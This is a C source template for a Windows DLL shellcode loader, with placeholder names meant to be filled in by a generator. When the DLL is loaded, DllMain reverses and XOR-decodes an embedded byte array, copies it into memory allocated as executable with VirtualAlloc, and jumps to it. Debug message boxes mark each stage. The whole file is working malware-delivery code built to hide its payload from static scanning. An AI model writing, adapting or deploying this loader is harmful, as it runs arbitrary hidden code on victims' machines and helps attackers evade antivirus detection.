#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "user32.lib")

unsigned char <NAME_TO_REPLACE>[] = <CODE_TO_REPLACE>; 
int size = sizeof(<NAME_TO_REPLACE>);

int rev_str(char *str)
{
	int len = size-1, i, temp;
	for (i = 0; i < len/2; i++) {
		temp = str[i];
		str[i] = str[len-i-1];
		str[len-i-1] = temp;
	}

	return 0;
}

int <FUNCTION_TO_REPLACE>(void) {
	MessageBox(NULL,"checkpoint","2",MB_OK);
	rev_str(<NAME_TO_REPLACE>);
	unsigned char <NAME_TO_REPLACE>2[size];

	int i;
	for (i = 0; i < size-2; i++) 
		<NAME_TO_REPLACE>2[i] = <NAME_TO_REPLACE>[i] ^ <NAME_TO_REPLACE>[i+1];
	<NAME_TO_REPLACE>2[i] = <NAME_TO_REPLACE>[i];
	<NAME_TO_REPLACE>2[++i] = '\0';
	rev_str(<NAME_TO_REPLACE>2);
	
	MessageBox(NULL,"checkpoint","3",MB_OK);

	void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    	memcpy(exec, <NAME_TO_REPLACE>2, size);
    	MessageBox(NULL,"checkpoint","4",MB_OK);	
	((void(*)())exec)();
	
	MessageBox(NULL,"checkpoint","5",MB_OK);

    	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved)
{
   	switch (nReason){
    	case DLL_PROCESS_ATTACH:
		MessageBox(NULL,"checkpoint","1",MB_OK);
		<FUNCTION_TO_REPLACE>();
        	MessageBox(NULL,"checkpoint","6",MB_OK);
		break;
    	case DLL_PROCESS_DETACH:
        	break;
    	case DLL_THREAD_ATTACH:
        	break;
    	case DLL_THREAD_DETACH:
        	break;
    	}
    	
	return TRUE;
}